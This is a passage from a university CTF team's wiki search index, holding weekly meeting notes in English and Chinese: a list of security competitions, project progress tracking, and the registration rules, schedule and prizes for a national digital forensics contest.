\u7b2c\u4e09\u5c4a\u7ea2\u660e\u8c37\u676f\u7f51\u7edc\u5b89\u5168\u5927\u8d5b\u51b3\u8d5b 24 \u7b2c\u516d\u5c4a\u201c\u5f3a\u7f51\u676f\u201d\u9752\u5c11\u5e74\u4e13\u9879\u8d5b\u51b3\u8d5b 25 2022\u5e74\u4e2d\u56fd\u5de5\u4e1a\u4e92\u8054\u7f51\u5b89\u5168\u5927\u8d5b\u5168\u56fd\u603b\u51b3\u8d5b 26 \u7b2c\u4e09\u5c4a\u201c\u7965\u4e91\u676f\u201d\u7f51\u7edc\u5b89\u5168\u5927\u8d5b\u51b3\u8d5b 27 ctfshow\u7b2c\u4e09\u5c4a\u611a\u4eba\u8d5b 28 \u7b2c\u4e09\u5c4a\u7ea2\u660e\u8c37\u676f\u7f51\u7edc\u5b89\u5168\u5927\u8d5b\u521d\u8d5b 29 2022\u5e74\u7b2c\u4e09\u5c4a\u201c\u7f51\u9f0e\u676f\u201d\u7f51\u7edc\u5b89\u5168\u5927\u8d5b\u51b3\u8d5b 30 \u7b2c\u4e03\u5c4aXCTF\u56fd\u9645\u7f51\u7edc\u653b\u9632\u8054\u8d5b\u603b\u51b3\u8d5b 31 hxp CTF 2022 32 2023\u5e7f\u4e1c\u6d77\u6d0b\u5927\u5b66\u7b2c\u96f6\u5c4a\u4fe1\u606f\u5b89\u5168\u7ade\u8d5b 33 PWNHUB\u5185\u90e8\u8d5b 34 PWNHUB\u516c\u5f00\u8d5b 35 NSSCTF Round#11 36 picoCTF 37 2023\u5e74\u7f51\u7edc\u201c\u653b&amp;\u9632\u201d\u6280\u80fd\u5927\u8d5b\u66a8\u7f51\u5b89\u4eba\u624d\u8bc4\u5b9a\u5de5\u7a0b 38 2022\u897f\u6e56\u8bba\u5251\u00b7\u7b2c\u516d\u5c4a\u676d\u5dde\u7f51\u7edc\u5b89\u5168\u6280\u80fd\u5927\u8d5b\u51b3\u8d5b 39 2023\u7b2c\u516d\u671fHWS\u786c\u4ef6\u5b89\u5168\u5728\u7ebf\u51ac\u4ee4\u8425 40 \u7f51\u7edc\u5b89\u5168\u5e73\u53f0\u6d4b\u8bd5\u8d5b</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-04-20/#wrap-up","title":"Wrap-up","text":"<p>Based on the discussions in the weekly meeting, it is clear that there are several exciting upcoming events in the near future, all of which offer outstanding prizes. As a result, it is important for all members of the team to stay informed and up-to-date on these events and to prepare accordingly if they plan to participate. Additionally, it may be beneficial for the team to consider other similar events or opportunities in order to continue honing their skills and staying competitive in the field. Overall, it is an exciting time for the team and the field as a whole, and everyone should be encouraged to participate and contribute in any way they can.</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-04-27/","title":"CTF Week Meeting 2023-04-27","text":"<p>As we gather today for our meeting, I wanted to take a moment to encourage everyone to approach new ideas and challenges with a willingness to learn and improve. We all have room for growth, and by collaborating and sharing our knowledge and experiences, we can inspire one another and propel ourselves to new heights. Let us embrace this opportunity to explore and expand our abilities, and work together towards our common goals.</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-04-27/#work-progress-tracking","title":"Work progress tracking","text":"<ol> <li>Topic: CTF combined with research - 20%</li> <li>Multi-platform promotion of COMPASS CTF - 30%</li> <li>New Platform GZCTF - 55%</li> <li>Wiki page content adjustment - 80%</li> <li>CTFtime program: play CTF and share - 32%</li> <li>New Member Recruitment - 70%</li> <li>Remedial content session - 100%</li> <li>CTF from Practice to Principle - 15%</li> <li>National College Student Information Security Contest - 30%</li> <li>Discussions with Other Universities about National College Student Information Software Competition - 15%</li> </ol>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-04-27/#what-we-discussed-this-week","title":"What we discussed this week","text":"<ol> <li>National Contest Topics.</li> <li>Upcoming Events.</li> </ol>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-04-27/#0x1-national-contest-topics","title":"0x1. National Contest Topics","text":"<p>\u4e94\u3001\u62a5\u540d\u987b\u77e5</p> <ol> <li> <p>\u4fe1\u606f\u5b89\u5168\u4f5c\u54c1\u8d5b\u7684\u7f51\u4e0a\u62a5\u540d\u8d77\u6b62\u65f6\u95f4\u4e3a\uff1a2023\u5e744\u67087\u65e5\u81f32023\u5e746\u670812\u65e524\u65f6\u3002</p> </li> <li> <p>\u5404\u9ad8\u6821\u5728\u6536\u5230\u672c\u53c2\u8d5b\u901a\u77e5\u540e\uff0c\u57285\u670831\u65e5\u524d\uff0c\u6307\u5b9a1\u4f4d\u8001\u5e08\u4f5c\u4e3a\u8054\u7edc\u4eba\uff08\u8054\u7edc\u4eba\u987b\u4e3a\u9ad8\u6821\u9886\u961f\uff09\uff0c\u8d1f\u8d23\u672c\u6821\u7ade\u8d5b\u76f8\u5173\u4e8b\u5b9c\uff0c\u5e76\u5728\u7ade\u8d5b\u7f51\u7ad9\u4e0a\u4e0b\u8f7d\u201c\u9ad8\u6821\u8054\u7edc\u6559\u5e08\u767b\u8bb0\u8868\u201d\uff08\u89c1\u9644\u4ef61\uff09\uff0c\u6309\u8981\u6c42\u586b\u5199\u8be5\u8001\u5e08\u4fe1\u606f\uff0c\u901a\u8fc7\u7535\u5b50\u90ae\u4ef6\u53d1\u9001\u7ed9\u7ec4\u59d4\u4f1a\u79d8\u4e66\u5904\uff08\u542b\u7535\u5b50\u7248\u548c\u76d6\u7ae0\u7eb8\u8d28\u7248\u7684\u626b\u63cf\u4ef6\uff09\u3002</p> </li> <li> <p>\u7ec4\u59d4\u4f1a\u4e8e6\u670819\u65e5\u5b8c\u6210\u4fe1\u606f\u5b89\u5168\u4f5c\u54c1\u8d5b\u8d44\u683c\u5ba1\u67e5\uff0c\u5e76\u516c\u5e03\u4fe1\u606f\u5b89\u5168\u4f5c\u54c1\u8d5b\u53c2\u8d5b\u540d\u5355\u3002\u4e8e6\u670825\u65e5\u524d\uff0c\u5404\u9ad8\u6821\u8054\u7edc\u4eba\u987b\u6c47\u603b\u672c\u6821\u7684\u201c\u9ad8\u6821\u53c2\u8d5b\u961f\u6c47\u603b\u8868\u201d\uff08\u89c1\u9644\u4ef62\uff0c\u5728\u7ade\u8d5b\u7f51\u7ad9\u4e0a\u4e0b\u8f7d\uff09\uff0c\u901a\u8fc7\u7535\u5b50\u90ae\u4ef6\u53d1\u9001\u7ed9\u7ec4\u59d4\u4f1a\u79d8\u4e66\u5904\uff08\u542b\u7535\u5b50\u7248\u548c\u76d6\u7ae0\u7eb8\u8d28\u7248\u7684\u626b\u63cf\u4ef6\uff09\u3002\u53c2\u52a0\u672c\u6b21\u4fe1\u606f\u5b89\u5168\u4f5c\u54c1\u8d5b\u7684\u961f\u4f0d\u9700\u4ea4\u7eb3\u53c2\u8d5b\u8d39\u7528\uff08\u6bcf\u652f\u53c2\u8d5b\u961f200\u5143\uff09\u3002</p> </li> </ol> <p>We have some topics, if you are interesting, please join us.</p> <ul> <li>AEG Automate Exploit Generation.</li> <li>Risc-v State Crypto.</li> </ul>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-04-27/#0x2-upcoming-events","title":"0x2. Upcoming Events","text":""},{"location":"Meeting/CTF%20Week%20Meeting%202023-04-27/#_1","title":"\u201c\u76d8\u53e4\u77f3\u676f\u201d\u5168\u56fd\u7535\u5b50\u6570\u636e\u53d6\u8bc1\u5927\u8d5b\u2014\u2014\u7535\u5b50\u6570\u636e\u53d6\u8bc1\u6280\u80fd\u8d5b","text":"<p>\u4e00\u3001 \u53c2\u8d5b\u89c4\u5219</p> <p>\uff08\u4e00\uff09\u62a5\u540d\u5f62\u5f0f</p> <p>\u91c7\u7528\u56e2\u961f\u6574\u4f53\u62a5\u540d\u65b9\u5f0f\uff0c\u5728\u62a5\u540d\u89c4\u5b9a\u65f6\u95f4\u5185\u6309\u7167\u62a5\u540d\u8981\u6c42\u8fdb\u884c\u62a5\u540d\uff0c\u6bcf\u4e2a\u53c2\u8d5b\u56e2\u961f\u56fa\u5b9a\u961f\u5458\u4e09\u4e2a\u4eba\uff0c\u53ef\u4ee5\u62a5\u540d\u804c\u4e1a\u7ec4\u6216\u8005\u5b66\u751f\u7ec4\u3002\u53e6\u6bcf\u4e2a\u53c2\u8d5b\u961f\u53ef\u4ee5\u5199\u4e00\u540d\u6307\u5bfc\u6559\u5e08\uff08\u5b66\u751f\u7ec4\uff09\u6216\u9886\u961f\uff08\u804c\u4e1a\u7ec4\uff09\uff0c\u6bcf\u4e2a\u6307\u5bfc\u6559\u5e08\uff08\u9886\u961f\uff09\u53ef\u4ee5\u5e26\u9886\u591a\u652f\u961f\u4f0d\u3002\u4e0d\u5141\u8bb8\u8de8\u6821\u8de8\u5355\u4f4d\u7ec4\u961f\u3002</p> <p>\uff08\u4e8c\uff09\u62a5\u540d\u65f6\u95f4</p> <p>2023\u5e743\u670820-4\u670830\u65e5</p> <p>\uff08\u4e09\uff09\u7ade\u8d5b\u65f6\u95f4</p> <p>\u664b\u7ea7\u8d5b\uff1a2023\u5e745\u67086\u65e5 5\u5c0f\u65f6 \u7ebf\u4e0a </p> <p>\u603b\u51b3\u8d5b\uff1a2023\u5e745\u670826\u65e5 6\u5c0f\u65f6 \u7ebf\u4e0b</p> <p>\uff08\u56db\uff09\u62a5\u540d\u8981\u6c42</p> <p>\u901a\u8fc7\u5927\u8d5b\u5b98\u7f51\u8fdb\u884c\u62a5\u540d\uff0c\u5982\u5b9e\u586b\u5199\u62a5\u540d\u4fe1\u606f\u3002</p> <p>\uff08\u4e94\uff09\u62a5\u540d\u6761\u4ef6</p> <p>\u5177\u6709\u7535\u5b50\u6570\u636e\u53d6\u8bc1\u76f8\u5173\u804c\u4e1a\u5de5\u4f5c\u7ecf\u5386\u7684\u4f01\u4e8b\u4e1a\u3001\u516c\u68c0\u6cd5\u5355\u4f4d\u5728\u804c\u4eba\u5458\uff0c\u4ece\u4e8b\u76f8\u5173\u4e13\u4e1a\u5de5\u4f5c\u7684\u9ad8\u7b49\u9662\u6821\u3001\u804c\u4e1a\u9662\u6821\uff08\u542b\u6280\u5de5\u9662\u6821\uff0c\u4e0b\u540c\uff09\u5728\u804c\u4eba\u5458\uff0c\u4ee5\u53ca\u9ad8\u7b49\u9662\u6821\u3001\u804c\u4e1a\u9662\u6821\u76f8\u5173\u4e13\u4e1a\u5168\u65e5\u5236\u5728\u7c4d\u5b66\u751f\u5747\u53ef\u62a5\u540d\u53c2\u8d5b\u3002</p> <p>\u6ce8\uff1a\u5177\u6709\u5168\u65e5\u5236\u5b66\u7c4d\u7684\u5728\u6821\u5b66\u751f\u4e0d\u5f97\u4ee5\u804c\u5de5\u8eab\u4efd\u53c2\u8d5b\u3002</p> <p>\u4e8c \u3001\u7ade\u8d5b\u6a21\u5f0f</p> <p>\u672c\u8d5b\u9879\u4e3a\u4e09\u4eba\u56e2\u4f53\u8d5b\uff0c\u5206\u4e3a\u804c\u4e1a\u7ec4\u548c\u5b66\u751f\u7ec4\u4e24\u4e2a\u7ec4\u522b\uff0c\u4e24\u4e2a\u7ec4\u5355\u72ec\u8fdb\u884c\u8bc4\u6bd4\u3002</p> <p>\u4e09 \u3001\u7ade\u8d5b\u7ec6\u5219</p> <p>\uff08\u4e00\uff09\u7ade\u8d5b\u77e5\u8bc6\u8303\u56f4</p> <p>PC\uff08win\u3001osx\uff09\u53d6\u8bc1\u5206\u6790\u3001Server\uff08win\u3001lin\uff09\u53d6\u8bc1\u5206\u6790\u3001\u79fb\u52a8\u7ec8\u7aef\uff08dd\u3001tar\u3001\u5907\u4efd\uff09\u53d6\u8bc1\u5206\u6790\u3001\u6d41\u91cf\u5206\u6790\uff08\u884c\u4e3a\u3001\u6587\u4ef6\u5206\u79bb\uff09\u3001\u7269\u8054\u7f51\uff08\u8def\u7531\u5668\u3001\u65e0\u4eba\u673a\uff09\u53d6\u8bc1\u5206\u6790\u3001\u5e94\u7528\u7a0b\u5e8f\u529f\u80fd\u5206\u6790\uff08\u52a8\u6001\u3001\u9759\u6001\uff09\u3001\u533a\u5757\u94fe\u53d6\u8bc1\u5206\u6790\u3001\u53ef\u89c6\u5316\u5206\u6790\u7b49\u3002</p> <p>\uff08\u4e8c\uff09\u7ade\u8d5b\u9898\u76ee\u7c7b\u578b </p> <p>\u7ade\u8d5b\u9898\u76ee\u4e3a\u5b9e\u9645\u64cd\u4f5c\u9898\uff0c\u7c7b\u578b\u6709\u9009\u62e9\u9898\u3001\u586b\u7a7a\u9898\u3002</p> <p>\uff08\u4e09\uff09\u7ade\u8d5b\u65f6\u957f</p> <p>\u664b\u7ea7\u8d5b\uff1a\u65f6\u957f5\u5c0f\u65f6\u3002</p> <p>\u603b\u51b3\u8d5b\uff1a\u65f6\u957f6\u5c0f\u65f6\u3002</p> <p>\uff08\u56db\uff09\u547d\u9898\u65b9\u5f0f</p> <p>\u7531\u5927\u8d5b\u7ec4\u59d4\u4f1a\u7ec4\u7ec7\u4e13\u5bb6\u7ec4\u7edf\u4e00\u547d\u9898\u3002</p> <p>\uff08\u4e94\uff09\u8003\u8bd5\u65b9\u5f0f </p> <p>\u91c7\u7528\u5947\u5b89\u4fe1\u76d8\u53e4\u77f3\u53d6\u8bc1\u57f9\u8bad\u6bd4\u6b66\u5e73\u53f0\u3002</p> <p>\u664b\u7ea7\u8d5b\uff1a\u7ebf\u4e0a\u65b9\u5f0f\u3002</p> <p>\u603b\u51b3\u8d5b\uff1a\u7ebf\u4e0b\u65b9\u5f0f\u3002</p> <p>\uff08\u516d\uff09\u664b\u7ea7\u89c4\u5219</p> <p>1.\u5b66\u751f\u7ec4\u664b\u7ea760\u652f\u961f\u4f0d\u3001\u804c\u4e1a\u7ec4\u664b\u7ea730\u652f\u961f\u4f0d\u3002</p> <p>2.\u5404\u9662\u6821\u3001\u5355\u4f4d\u664b\u7ea7\u8d5b\u53ef\u4ee5\u62a5\u540d\u591a\u652f\u961f\u4f0d\uff0c\u4f46\u4e0d\u8d85\u8fc72\u652f\u961f\u4f0d\u664b\u7ea7\u603b\u51b3\u8d5b\u3002</p> <p>\u56db \u3001\u8bc4\u5206\u7ec6\u5219</p> <p>\uff08\u4e00\uff09\u6210\u7ee9\u8ba1\u7b97</p> <p>\u7ade\u8d5b\u4e3a\u5f97\u5206\u7d2f\u52a0\u5236\uff0c\u4e0d\u540c\u96be\u5ea6\u9898\u76ee\u5206\u503c\u4e0d\u540c\uff0c\u5206\u503c\u76f8\u540c\u4ee5\u7b54\u9898\u65f6\u95f4\u6392\u540d</p> <p>\uff08\u4e8c\uff09\u8bc4\u5206\u6807\u51c6\u5236\u5b9a\u539f\u5219</p> <p>\u672c\u7740\u201c\u79d1\u5b66\u4e25\u8c28\u3001\u7b03\u8fd1\u4e3e\u8fdc\u201d\u7684\u539f\u5219\u5236\u5b9a\u8bc4\u5206\u6807\u51c6\uff0c\u56f4\u7ed5\u6280\u80fd\u5927\u8d5b\u6280\u672f\u88c1\u5224\u7ec4\u5236\u5b9a\u7684\u8003\u6838\u6807\u51c6\uff0c\u4f9d\u636e\u53c2\u8d5b\u9009\u624b\u5b8c\u6210\u7684\u60c5\u51b5\u5b9e\u65bd\u7efc\u5408\u8bc4\u5b9a\uff0c\u5168\u9762\u8bc4\u4ef7\u53c2\u8d5b\u9009\u624b\u4e13\u4e1a\u80fd\u529b\u3002</p> <p>\uff08\u4e09\uff09\u8bc4\u5206\u65b9\u6cd5</p> <p>1.\u57fa\u672c\u8bc4\u5b9a\u65b9\u6cd5</p> <p>\u88c1\u5224\u7ec4\u5728\u575a\u6301\u201c\u516c\u5e73\u3001\u516c\u6b63\u3001\u516c\u5f00\u3001\u79d1\u5b66\u3001\u89c4\u8303\u201d\u7684\u539f\u5219\u4e0b\uff0c\u5404\u8d1f\u5176\u8d23\uff0c\u6309\u7167\u5236\u8ba2\u7684\u8bc4\u5206\u7ec6\u5219\u8fdb\u884c\u8bc4\u5206\u3002</p> <p>\u7ed3\u679c\u8bc4\u5206\uff1a\u6bd4\u8d5b\u7ed3\u675f\u540e\uff0c\u88c1\u5224\u7ec4\u6839\u636e\u53c2\u8d5b\u9009\u624b\u63d0\u4ea4\u7684\u6bd4\u8d5b\u7ed3\u679c\u8fdb\u884c\u6210\u7ee9\u590d\u6838\u3002</p> <p>\u6210\u7ee9\u6c47\u603b\uff1a\u5b9e\u64cd\u6bd4\u8d5b\u6210\u7ee9\u7ecf\u8fc7\u52a0\u5bc6\u88c1\u5224\u7ec4\u89e3\u5bc6\u540e\u4e0e\u9009\u624b\u7406\u8bba\u6210\u7ee9\u8fdb\u884c\u52a0\u6743\u8ba1\u7b97\uff0c\u786e\u5b9a\u6700\u7ec8\u6bd4\u8d5b\u6210\u7ee9\uff0c\u7ecf\u603b\u88c1\u5224\u957f\u5ba1\u6838\u3001\u4ef2\u88c1\u7ec4\u957f\u590d\u6838\u540e\u7b7e\u5b57\u786e\u8ba4\u3002</p> <p>2.\u540c\u5206\u5904\u7406</p> <p>\u603b\u5206\u76f8\u540c\u65f6\uff0c\u4ee5\u5b8c\u6210\u5b9e\u64cd\u6240\u7528\u65f6\u95f4\u5c11\u7684\u540d\u6b21\u5728\u524d\u3002</p> <p>\u4e94 \u3001\u7ade\u8d5b\u5e73\u53f0</p> <p>\u6bd4\u6b66\u5e73\u53f0\u5730\u5740\uff1a\u5f85\u516c\u5e03</p> <p>\u516d \u3001\u5956\u9879\u8bbe\u7f6e</p> <p>\u804c\u4e1a\u7ec4\uff1a</p> <p>\u4e00\u7b49\u5956\uff1a1-5\u540d \uff08\u7b2c1\u540d20000\u5143\u3001\u7b2c2-5\u540d10000\u5143\uff09\uff0c\u5956\u676f\u3001\u83b7\u5956\u8bc1\u4e66</p> <p>\u4e8c\u7b49\u5956\uff1a6-15\u540d  \u83b7\u5956\u8bc1\u4e66</p> <p>\u4e09\u7b49\u5956\uff1a16-30\u540d  \u83b7\u5956\u8bc1\u4e66</p> <p>\u5b66\u751f\u7ec4\uff1a</p> <p>\u4e00\u7b49\u5956\uff1a1-5\u540d \uff08\u7b2c1\u540d20000\u5143\u3001\u7b2c2-5\u540d10000\u5143\uff09\uff0c\u5956\u676f\u3001\u83b7\u5956\u8bc1\u4e66</p> <p>\u4e8c\u7b49\u5956\uff1a6-15\u540d  \u83b7\u5956\u8bc1\u4e66</p> <p>\u4e09\u7b49\u5956\uff1a16-30\u540d  \u83b7\u5956\u8bc1\u4e66</p> <p>\u4f18\u79c0\u5956\uff1a31-60\u540d  \u83b7\u5956\u8bc1\u4e66</p> <p>\u9664\u6b64\u4e4b\u5916\uff0c\u5c06\u8bc4\u9009\u4f18\u79c0\u6307\u5bfc\u6559\u5e08\uff08\u9886\u961f\uff09\u517110\u540d\uff1a5000\u5143\u5956\u91d1\u3001\u5956\u676f\u3001\u83b7\u5956\u8bc1\u4e66</p> <p>\u4f18\u79c0\u6307\u5bfc\u6559\u5e08\uff08\u9886\u961f\uff09\u8bc4\u9009\u89c4\u5219\u91c7\u7528\u79ef\u5206\u5236\u5ea6\uff0c\u6240\u5e26\u961f\u4f0d\u83b7\u5f97\u4e09\u7b49\u5956\u8ba11\u5206\u3001\u4e8c\u7b49\u5956\u8ba12\u5206\u3001\u4e00\u7b49\u5956\u8ba13\u5206\u3001\u7279\u7b49\u5956\u8ba14\u5206\u3002\u603b\u5206\u6570\u524d10\u540d\u7684\u6307\u5bfc\u6559\u5e08\u53ca\u9886\u961f\u83b7\u5f97\u8be5\u5956\u9879\u3002</p> <p>\u4e03\u3001 \u8054\u7edc\u4fe1\u606f</p> <p>1\u3001\u8054\u7cfb\u4eba\uff1a\u5947\u5b89\u4fe195015</p> <p>2\u3001\u5b98\u65b9\u516c\u4f17\u53f7\uff1a</p> <p></p> <p>3\u3001\u5b98\u65b9QQ\u7fa4\uff1a</p> <p>\u9996\u5c4a\u76d8\u53e4\u77f3\u676f\u53d6\u8bc1\u8d5b\u4ea4\u6d41\u2460\u7fa4\uff1a731605363\uff08\u5df2\u6ee1\uff09</p> <p>\u9996\u5c4a\u76d8\u53e4\u77f3\u676f\u53d6\u8bc1\u8d5b\u4ea4\u6d41\u2461\u7fa4\uff1a748211652\uff08\u63a8\u8350\uff09</p> <p>\u9996\u5c4a\u76d8\u53e4\u77f3\u676f\u53d6\u8bc1\u8d5b\u4ea4\u6d41\u2462\u7fa4\uff1a748676470\uff08\u63a8\u8350\uff09</p> <p>\u9996\u5c4a\u76d8\u53e4\u77f3\u676f\u53d6\u8bc1\u8d5b\u4ea4\u6d41\u2463\u7fa4\uff1a753358988\uff08\u63a8\u8350\uff09</p> <p>\u5907\u6ce8:\u540e\u7eed\u518d\u5f00\u7fa4\u5c06\u53e6\u884c\u901a\u77e5\u3002</p> <p>\u516b \u3001\u5176\u4ed6</p> <p>\u672c\u53c2\u8d5b\u4ecb\u7ecd\u7684\u6700\u7ec8\u89e3\u91ca\u6743\u5f52\u7ade\u8d5b\u7ec4\u59d4\u4f1a\u3002</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-04-27/#_2","title":"\u201c\u76d8\u53e4\u77f3\u676f\u201d\u5168\u56fd\u7535\u5b50\u6570\u636e\u53d6\u8bc1\u5927\u8d5b \u2014 \u6570\u5b57\u53d6\u8bc1\u4f5c\u54c1\u8d5b","text":"<p>\u4e3a\u4e86\u57f9\u517b\u3001\u9009\u62d4\u3001\u63a8\u8350\u6570\u5b57\u53d6\u8bc1\u9886\u57df\u79d1\u7814\u4e0e\u5de5\u7a0b\u80fd\u529b\u517c\u5907\u7684\u4e00\u6d41\u4eba\u624d\uff0c\u63d0\u9ad8\u53c2\u8d5b\u4eba\u5458\u7684\u521b\u65b0\u610f\u8bc6\u3001\u56e2\u961f\u5408\u4f5c\u7cbe\u795e\u3001\u53d6\u8bc1\u6280\u672f\u7814\u53d1\u6c34\u5e73\u4ee5\u53ca\u521b\u65b0\u5b9e\u8df5\u4e0e\u7efc\u5408\u8bbe\u8ba1\u80fd\u529b\uff0c\u63a8\u52a8\u6570\u636e\u53d6\u8bc1\u524d\u6cbf\u7814\u7a76\u4e0e\u5e94\u7528\u6280\u672f\u84ec\u52c3\u53d1\u5c55\u3002\u201c\u76d8\u53e4\u77f3\u676f\u201d\u5168\u56fd\u7535\u5b50\u6570\u636e\u53d6\u8bc1\u5927\u8d5b\u62df\u9762\u5411\u5b66\u672f\u754c\u3001\u4ea7\u4e1a\u754c\u4ee5\u53ca\u653f\u4f01\u90e8\u95e8\uff0c\u5f00\u8bbe\u6570\u5b57\u53d6\u8bc1\u4f5c\u54c1\u8d5b\u8d5b\u9053\uff0c\u4e3a\u76f8\u5173\u4ece\u4e1a\u4eba\u5458\u63d0\u4f9b\u7ade\u6280\u548c\u5c55\u793a\u7684\u5e73\u53f0\u3002</p> <p>\u672c\u6307\u5357\u4e3a\u53c2\u8d5b\u4eba\u5458\u548c\u6307\u5bfc\u6559\u5e08\u5982\u4f55\u53c2\u4e0e\u672c\u6b21\u5927\u8d5b\u4f5c\u54c1\u8d5b\u63d0\u4f9b\u5177\u4f53\u6307\u5bfc\u3002</p> <p>\u4e00\u3001\u53c2\u8d5b\u53ca\u62a5\u540d</p> <ol> <li> <p>\u62a5\u540d\u622a\u6b62\u65e5\u671f\u4e4b\u524d\u7684\u5728\u6821\u7814\u7a76\u751f\u3001\u672c\u79d1\u751f\u3001\u4e13\u79d1\u751f\u3001\u4f01\u4e1a\u6210\u5458\u5747\u53ef\u62a5\u540d\u53c2\u8d5b\uff0c\u8bc4\u9009\u4e0d\u5206\u7c7b\u522b\u3001\u7edf\u4e00\u8bc4\u6bd4\u3002\u9f13\u52b1\u4f5c\u54c1\u4ee5\u5b9e\u9645\u5e94\u7528\u4e3a\u5bfc\u5411\uff0c\u5f00\u5c55\u524d\u6cbf\u7814\u7a76\u3002</p> </li> <li> <p>\u672c\u8d5b\u9879\u91c7\u7528\u7ec4\u961f\u65b9\u5f0f\u53c2\u8d5b\uff0c\u6bcf\u652f\u53c2\u8d5b\u961f\u6210\u5458\u4e0d\u8d85\u8fc74\u540d\uff08\u5305\u62ec1\u540d\u7ec4\u957f\uff09\u3001\u6307\u5bfc\u6559\u5e08\u4e0d\u8d85\u8fc72\u540d\u3001\u53c2\u8d5b\u5355\u4f4d\u4e0d\u8d85\u8fc72\u4e2a\u3002</p> </li> </ol> <p>\u200b     \u6ce8\uff1a\u9f13\u52b1\u8de8\u5355\u4f4d\u3001\u6821\u4f01\u8054\u5408\u7ec4\u961f\u7533\u62a5\uff0c\u53c2\u8d5b\u6210\u5458\u6700\u591a\u6765\u81ea\u4e8e2\u5bb6\u5355\u4f4d\u3002</p> <ol> <li> <p>\u6ce8\u518c\uff1a\u5404\u53c2\u8d5b\u961f\u4f0d\u6210\u5458\u53ef\u4ee5\u901a\u8fc7\u7ade\u8d5b\u7f51\u7ad9\u8fdb\u884c\u6ce8\u518c\uff08\u8be6\u7ec6\u53c2\u8d5b\u6b65\u9aa4\u89c1\u7f51\u7ad9\uff09</p> </li> <li> <p>\u62a5\u540d\u622a\u6b62\u65f6\u95f4\uff1a2023.4.30</p> </li> </ol> <p>\u53c2\u8d5b\u4f5c\u54c1\u4e0a\u4f20\u65f6\u95f4\uff1a2023.5.1\u20142023.5.5</p> <p>\u51b3\u8d5b\u540d\u5355\u516c\u5e03\u65e5\u671f\uff1a2023.5.15</p> <p>\u51b3\u8d5b\u65f6\u95f4\uff1a2023.5.26</p> <p>\u4e8c\u3001\u8d5b\u5236\u8bbe\u7f6e</p> <p>\u672c\u4f5c\u54c1\u8d5b\u8d5b\u9053\u91c7\u7528\u5f00\u653e\u5f0f\u81ea\u4e3b\u547d\u9898\u65b9\u5f0f\u3002\u7ade\u8d5b\u5206\u4e3a\u521d\u8d5b\u548c\u51b3\u8d5b\uff0c\u521d\u8d5b\u7ebf\u4e0a\u63d0\u4ea4\u4f5c\u54c1\uff0c\u7531\u7ec4\u59d4\u4f1a\u7ec4\u7ec7\u4e13\u5bb6\u7ebf\u4e0a\u8bc4\u5ba1\uff0c\u51b3\u8d5b\u91c7\u7528\u73b0\u573a\u7b54\u8fa9\u7684\u5f62\u5f0f\uff0c\u5c06\u4e8e5.26-28\u65e5\u5728\u5357\u4eac\u7ebf\u4e0b\u4e3e\u884c\u3002</p> <ol> <li>\u521d\u8d5b</li> </ol> <p>\u51e1\u6210\u529f\u62a5\u540d\u7684\u53c2\u8d5b\u961f\u5747\u81ea\u52a8\u8fdb\u5165\u521d\u8d5b\uff0c\u62a5\u540d\u622a\u6b62\u65f6\u95f4\u4e3a2023\u5e744\u670830\u65e5\uff0c\u521d\u8d5b\u4f5c\u54c1\u63d0\u4ea4\u65f6\u95f4\u622a\u6b62\u4e3a2023\u5e745\u67085\u65e5\uff0c\u5404\u53c2\u8d5b\u961f\u5e94\u5728\u6b64\u65f6\u95f4\u4e4b\u524d\u5b8c\u6210\u4f5c\u54c1\u5e76\u7f51\u4e0a\u63d0\u4ea4\uff0c\u7531\u4e13\u5bb6\u8fdb\u884c\u8bc4\u5ba1\u3002</p> <ol> <li>\u51b3\u8d5b</li> </ol> <p>\uff081\uff09\u83b7\u5f97\u51b3\u8d5b\u8d44\u683c\u540e\uff0c\u5404\u53c2\u8d5b\u961f\u53ef\u7ee7\u7eed\u5bf9\u53c2\u8d5b\u4f5c\u54c1\u8fdb\u884c\u5b8c\u5584\u548c\u4fee\u6539\uff0c\u4f46\u4fee\u6539\u4e0d\u80fd\u8d85\u8fc7\u4f5c\u54c1\u603b\u5185\u5bb9\u768430%\uff0c\u6838\u5fc3\u601d\u60f3\u3001\u4e3b\u8981\u529f\u80fd\u9700\u4fdd\u6301\u4e0d\u53d8\u3002</p> <p>\uff082\uff09\u83b7\u5f97\u51b3\u8d5b\u8d44\u683c\u7684\u53c2\u8d5b\u961f\u4f0d\u5e94\u5728\u89c4\u5b9a\u65f6\u95f4\u5185\u53c2\u52a0\u51b3\u8d5b\u4f5c\u54c1\u6f14\u793a\u53ca\u7b54\u8fa9\u3002</p> <p>\uff083\uff09\u51b3\u8d5b\u4f5c\u54c1\u6f14\u793a\u53ca\u7b54\u8fa9\u3002\u4f5c\u54c1PPT\u4ecb\u7ecd\uff088\u5206\u949f\uff09\u3001\u4f5c\u54c1\u6f14\u793a\u4e0e\u4e13\u5bb6\u63d0\u95ee\uff0812\u5206\u949f\uff09\u3002</p> <p>\uff084\uff09\u5404\u53c2\u8d5b\u961f\u5e94\u81ea\u884c\u643a\u5e26\u4f5c\u54c1\u53ca\u76f8\u5173\u6587\u6863\uff0c\u5230\u51b3\u8d5b\u5730\u70b9\u8fdb\u884c\u6f14\u793a\u3001\u7b54\u8fa9\u3002</p> <ol> <li>\u8bc4\u5ba1</li> </ol> <p>\u521d\u8d5b\u8bc4\u5ba1\uff1a\u7ec4\u59d4\u4f1a\u7ec4\u7ec7\u4e13\u5bb6\u5bf9\u4f5c\u54c1\u8fdb\u884c\u7ebf\u4e0a\u8bc4\u5ba1\uff0c\u8bc4\u5ba1\u91c7\u7528\u53cc\u76f2\u533f\u540d\u65b9\u5f0f\uff0c\u6bcf\u4e00\u4ef6\u4f5c\u54c1\u5c06\u81f3\u5c11\u75313\u4f4d\u4e13\u5bb6\u8fdb\u884c\u8bc4\u5ba1\u3002\u4e13\u5bb6\u8bc4\u5ba1\u7684\u4e3b\u8981\u5185\u5bb9\u5305\u62ec\uff1a\u4f5c\u54c1\u7684\u539f\u521b\u6027\u4e0e\u521b\u65b0\u6027\u3001\u4f5c\u54c1\u5b8c\u6210\u7a0b\u5ea6\u3001\u4f5c\u54c1\u7684\u6027\u80fd\u3001\u4f5c\u54c1\u7684\u5e94\u7528\u4ef7\u503c\u3001\u76f8\u5173\u6587\u6863\u7684\u89c4\u8303\u6027\u7b49\u3002\u4f9d\u636e\u7f51\